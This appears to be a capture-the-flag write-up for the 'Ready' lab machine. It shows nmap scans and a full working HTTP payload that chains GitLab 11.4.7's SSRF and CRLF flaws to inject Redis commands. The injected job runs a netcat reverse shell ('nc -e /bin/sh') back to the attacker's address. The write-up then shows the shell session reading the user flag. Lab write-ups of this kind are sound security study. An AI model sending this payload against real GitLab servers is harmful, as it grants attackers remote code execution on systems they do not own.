# Ready
Nmap enumeration:
```
➜  ~ nmap -p- 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 12:57 CET
Nmap scan report for 10.10.10.220
Host is up (0.044s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 19.11 seconds
➜  ~ nmap -p22,5080 -sV 10.10.10.220 
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-14 12:58 CET
Nmap scan report for 10.10.10.220
Host is up (0.034s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```

Browsing to the `http://10.10.10.220:5080/` displays a gitlab page.
After creating a user and logging in we can browse to `http://10.10.10.220:5080/help`
Here it says that the site is running `GitLab Community Edition 11.4.7`.
Looking at the changelogs for [11.4.8](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/changelogs/archive-11.md)
shows us a lot of security improvements. A lot of them are `xxs` which isn't all that
interesting to us. However a know exploit exists by combining the mentioned `SSRF` and `CRLF` vulnerbilities.
Using the exploit decscribed [HERE](https://github.com/jas502n/gitlab-SSRF-redis-RCE).
We set up a netcat listener on port 1234 and send the payload:
```
POST /projects HTTP/1.1
Host: 10.10.10.220:5080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.220:5080/projects/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 784
Origin: http://10.10.10.220:5080
Connection: close
Cookie: _gitlab_session=050b6281095ed74de6409216d93be742
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=VD3rPVQgGj7m3sXD1g5Oswb9KpCKy05bXaDaSTsGtQXi6RWA9el0XbKOEQogyoBd1A1qUIw0RcqKuoCIv%2BxlLw%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2Fssrftt.git
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/sh 10.10.14.56 1234 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
&project%5Bci_cd_only%5D=false&project%5Bname%5D=ssrftt&project%5Bnamespace_id%5D=7&project%5Bpath%5D=ssrftt&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
```
This gains us a shell on the targeted system and we're able to read the user flag:
```
➜  ~ nc -lnvp 1234
Connection from 10.10.10.220:34922
python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$ cd /home
cd /home
git@gitlab:/home$ ls -la
ls -la
total 12
drwxr-xr-x 1 root root 4096 Dec  2 10:45 .
drwxr-xr-x 1 root root 4096 Dec 14 12:12 ..
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 dude
git@gitlab:/home$ cd dude
cd dude
git@gitlab:/home/dude$ ls -la
ls -la
total 24
drwxr-xr-x 2 dude dude 4096 Dec  7 16:58 .
drwxr-xr-x 1 root root 4096 Dec  2 10:45 ..
lrwxrwxrwx 1 root root    9 Dec  7 16:58 .bash_history -> /dev/null
-rw-r--r-- 1 dude dude  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 dude dude 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 dude dude  655 May 16  2017 .profile
-r--r----- 1 dude git    33 Dec  2 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt
cat user.txt
e1e***************************82
```
